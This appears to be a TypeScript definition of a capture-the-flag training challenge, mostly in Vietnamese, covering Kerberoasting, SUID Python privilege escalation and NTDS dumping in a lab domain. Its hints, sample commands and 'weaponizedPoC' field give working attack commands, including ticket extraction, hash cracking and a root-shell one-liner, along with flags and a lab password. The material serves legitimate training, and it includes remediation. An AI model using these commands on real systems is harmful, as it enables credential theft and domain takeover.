import type { ArenaChallenge } from '../../types';

export const challengeKerberoasting: ArenaChallenge = {
  id: 'ad-kerb-01-kerberoasting',
  title: 'Active Directory Kerberoasting to Linux Member SUID Root',
  category: 'active-directory',
  severity: 'high',
  cvssScore: 8.8,
  bountyReward: 5800,
  xpReward: 1150,
  estimatedMinutes: 25,
  targetHost: '172.16.1.10',
  targetPort: 88,
  tagline:
    'Khai thác vé Kerberos TGS, SSH vào Linux Domain Member Server CORP-APP01, leo quyền qua SUID Python và pivot sang DC.',
  scenarioBriefing:
    'Domain corp.internal cấu hình tài khoản dịch vụ svc_mssql dùng mã hóa RC4 yếu. Kẻ tấn công trích xuất vé TGS bằng impacket-GetUserSPNs, crack hash mật khẩu offline, đăng nhập SSH vào máy chủ Linux Member Server (CORP-APP01: 172.16.1.10), leo quyền Root qua SUID Python3 và dump toàn bộ NTDS.dit của Domain Controller (172.16.1.5).',
  keyObjectives: [
    'Giai đoạn 1 (Kerberoasting & Crack): Chạy impacket-GetUserSPNs trích xuất TGS ticket và dùng John the Ripper crack ra password của svc_mssql.',
    'Giai đoạn 2 (Member Foothold & User Flag): Đăng nhập SSH vào Linux Member Server CORP-APP01, đọc User Flag tại /home/operator/user.txt.',
    'Giai đoạn 3 (SUID PrivEsc to ROOT): Tìm SUID binary (/usr/bin/python3), khai thác GTFOBins spawn shell root (UID 0), đọc Root Flag tại /root/root.txt và chạy secretsdump.py pivot sang DC.',
  ],
  userFlag: 'OS_0DAY{ad_kerberoast_svc_mssql_cracked_Summer2026!}',
  rootFlag: 'OS_0DAY{ad_domain_privesc_suid_python_pwned}',
  expectedFlag: 'OS_0DAY{ad_domain_privesc_suid_python_pwned}',
  hints: [
    {
      level: 0,
      name: 'SPN Ticket Extraction',
      penaltyPercent: 0,
      hintText:
        'Chạy "impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request" để trích xuất hash.',
    },
    {
      level: 1,
      name: 'Offline Hash Cracking',
      penaltyPercent: 10,
      hintText:
        'Dùng wordlist rockyou: "john --wordlist=/usr/share/wordlists/rockyou.txt /home/operator/ad-tools/hashes.kerb".',
    },
    {
      level: 2,
      name: 'SUID Binary Enumeration',
      penaltyPercent: 20,
      hintText:
        'Trên máy chủ Linux Member Server, tìm binary SUID: "find / -perm -4000 2>/dev/null".',
    },
    {
      level: 3,
      name: 'SUID Python GTFOBins Execution',
      penaltyPercent: 40,
      hintText:
        'Khai thác SUID Python3: python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\' để nâng quyền lên root.',
    },
  ],
  firstBloodHolder: {
    handle: '@ghost_zero',
    timeRecord: '08m 15s',
  },
  supportedTools: ['terminal', 'diff'],
  defaultTool: 'terminal',
  terminalConfig: {
    hostname: 'kali-operator',
    ip: '10.0.4.15',
    user: 'operator',
    initialDirectory: '/home/operator/ad-tools',
    sampleCommands: [
      'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request',
      'john --wordlist=/usr/share/wordlists/rockyou.txt /home/operator/ad-tools/hashes.kerb',
      'find / -perm -4000 2>/dev/null',
      'python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
      'secretsdump.py',
    ],
    bannerText:
      '[*] Active Directory Attack Suite - Domain: corp.internal\n' +
      '[*] Domain Controller: 172.16.1.5 (CORP-DC01) | Member Server: 172.16.1.10 (CORP-APP01)\n',
  },
  writeup: {
    title: 'Active Directory Kerberoasting to Linux Member SUID Takeover',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
    vulnerabilityOverview:
      'Tài khoản dịch vụ có SPN dùng mã hóa RC4 cho phép kẻ tấn công yêu cầu vé TGS và crack offline. Dùng tài khoản đăng nhập SSH vào máy chủ Linux Member Server CORP-APP01, khai thác SUID Python3 để leo lên Root và dump toàn bộ NTDS.dit của Domain.',
    rootCauseAnalysis:
      '1. SPN svc_mssql dùng mật khẩu yếu (Summer2026!).\n2. Binary /usr/bin/python3 trên máy chủ Linux Member Server bị gán cờ SUID 04755.',
    exploitChainWalkthrough: [
      'Bước 1: Trích xuất vé TGS bằng impacket-GetUserSPNs và crack hash lấy mật khẩu Summer2026!.',
      'Bước 2: Đăng nhập SSH vào CORP-APP01 và đọc User Flag tại /home/operator/user.txt.',
      'Bước 3: Chạy find / -perm -4000 phát hiện SUID Python, nâng quyền lên root lấy Root Flag tại /root/root.txt.',
      'Bước 4: Chạy secretsdump.py trích xuất NTLM hash của Domain Administrator.',
    ],
    weaponizedPoC:
      'impacket-GetUserSPNs corp.internal/operator:Pass123 -dc-ip 172.16.1.5 -request\njohn --wordlist=rockyou.txt hashes.kerb\npython3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
    remediationSnippet:
      '// 1. Chuyển sang Group Managed Service Accounts (gMSA).\n// 2. Gỡ bỏ quyền SUID trên python3:\nchmod 0755 /usr/bin/python3',
  },
};
